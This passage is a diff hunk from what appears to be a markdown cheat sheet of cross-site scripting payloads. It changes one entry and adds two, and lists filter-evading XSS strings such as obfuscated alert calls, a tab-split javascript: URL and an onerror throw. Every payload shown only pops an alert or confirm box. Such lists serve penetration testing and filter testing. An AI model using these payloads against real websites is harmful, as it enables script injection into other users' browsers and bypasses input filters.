@@ -154,8 +154,10 @@ xss><svg/onload=globalThis[`al`+/ert/.source]`1`//
 ><div onactivate=confirm('Xss')> 
 <a href="javas%09cript:[1].map(top['ale'+'rt'])">
 <svg/onload=location=javas+cript:ale+rt%2+81%2+9;//
-'/><img/src/onerror=confirm()>
+'/><img/src/onerror=confirm(1)>
 %E2%80%A8%E2%80%A9confirm(1)
+;confirm(document.domain)//
+;onerror=alert;throw%201
 ```
 
 ## XSS + SSRF <br>
